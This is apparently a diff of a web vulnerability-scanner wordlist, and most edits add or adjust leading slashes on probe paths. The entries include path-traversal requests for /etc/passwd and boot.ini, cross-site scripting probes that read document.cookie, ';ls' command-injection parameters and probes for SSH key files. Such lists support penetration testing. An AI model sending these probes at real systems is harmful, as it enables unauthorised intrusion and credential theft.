@@ -393,7 +393,7 @@ cgi-bin/fortune
 cgi-bin/redirect
 cgi-bin/uptime
 cgi-bin/wais.pl
-
+/
 webtop/wdk/
 SilverStream
 signon
@@ -499,9 +499,9 @@ php/php.exe?c:\boot.ini
 ../../../../../../../../../boot.ini
 ../../../../winnt/repair/sam._
 ..\\..\\..\\..\\..\\..\\..\\boot.ini
-/etc/passwd
-/etc/hosts
-//./../.../boot.ini
+//etc/passwd
+//etc/hosts
+///./../.../boot.ini
 .cobalt/sysManage/../admin/.htaccess
 autohtml.php?op=modload&mainfile=x&name=/etc/passwd
 atomicboard/index.php?location=../../../../../../../../../../etc/passwd
@@ -781,7 +781,7 @@ a.jsp/<script>alert('Vulnerable')</script>
 <script>alert('Vulnerable')</script>.shtml
 <script>alert('Vulnerable')</script>.jsp
 <script>alert('Vulnerable')</script>.aspx
-comment.php?mode=Delete&sid=1&cid=&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+/comment.php?mode=Delete&sid=1&cid=&lt;script&gt;alert(document.cookie)&lt;/script&gt;
 &lt;script&gt;alert('Vulnerable');&lt;/script&gt;
 cgi-bin/title.cgi
 cgi-bin/compatible.cgi
@@ -1013,7 +1013,7 @@ _vti_pvt/writeto.cnf
 _vti_pvt/linkinfo.cnf
 admin/
 isx.html
-/
+//
 cgi-bin/blog/mt-check.cgi
 mailman/admin/ml-name?\"><script>alert('Vulnerable')</script>;
 mail/addressaction.html?id=<USERID#>&newaddress=1&addressname=<script>alert('Vulnerable')</script>&addressemail=junk@example.com
@@ -1174,7 +1174,7 @@ cgi-bin/gbook/gbook.cgi?_MAILTO=xx;ls
 cgi-bin/bslist.cgi?email=x;ls
 cgi-bin/bsguest.cgi?email=x;ls
 cgi-bin/nbmember.cgi?cmd=list_all_users
-admin/admin.shtml
+/admin/admin.shtml
 axis-cgi/buffer/command.cgi
 support/messages
 index.php?err=3&email=\"><script>alert(document.cookie)</script>
@@ -1244,7 +1244,7 @@ iisadmpwd/aexp2b.htr
 iisadmpwd/aexp3.htr
 iisadmpwd/aexp4.htr
 iisadmpwd/aexp4b.htr
-admin/aindex.htm
+/admin/aindex.htm
 cgi-bin/gbadmin.cgi?action=change_adminpass
 cgi-bin/gbadmin.cgi?action=change_automail
 cgi-bin/gbadmin.cgi?action=colors
@@ -2436,8 +2436,8 @@ cgi-bin/.www_acl
 .ssh/authorized_keys
 .ssh/known_hosts
 cgi-bin/ls
-//../../data/config/microsrv.cfg
-//////../../../../../../etc/passwd
+///../../data/config/microsrv.cfg
+///////../../../../../../etc/passwd
 _vti_bin/shtml.exe/_vti_rpc
 doc/rt/overview-summary.html
 docs/sdb/en/html/index.html
@@ -2687,7 +2687,7 @@ conspass.chl+
 consport.chl+
 general.chl+
 srvstatus.chl+
-//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 firewall/policy/dlg?q=-1&fzone=t<script>alert('Vulnerable')</script>>&tzone=dmz
 firewall/policy/policy?fzone=internal&tzone=dmz1<script>alert('Vulnerable')</script>
 antispam/listdel?file=blacklist&name=b<script>alert('Vulnerable')</script>&startline=0
@@ -2994,7 +2994,7 @@ _pages/_webapp/_admin/_showjavartdetails.java
 _pages/_demo/
 _pages/_webapp/_jsp/
 _pages/_demo/_sql/
-OA_HTML/_pages/
+/OA_HTML/_pages/
 OA_HTML/webtools/doc/index.html
 reports/rwservlet?server=repserv+report=/tmp/hacker.rdf+destype=cache+desformat=PDF
 apex/
